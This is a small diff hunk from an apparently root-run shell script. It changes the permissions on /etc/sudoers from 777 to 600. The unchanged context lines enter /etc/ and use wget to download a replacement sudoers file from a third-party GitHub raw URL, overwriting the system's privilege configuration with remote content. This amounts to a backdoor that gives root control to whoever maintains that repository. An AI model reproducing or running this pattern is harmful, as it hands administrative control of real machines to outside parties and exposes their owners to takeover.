@@ -54,7 +54,7 @@ cd /etc/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/sudoers
 
-chmod 777 -R /etc/sudoers
+chmod 600 -R /etc/sudoers
 
 cd /root/
 
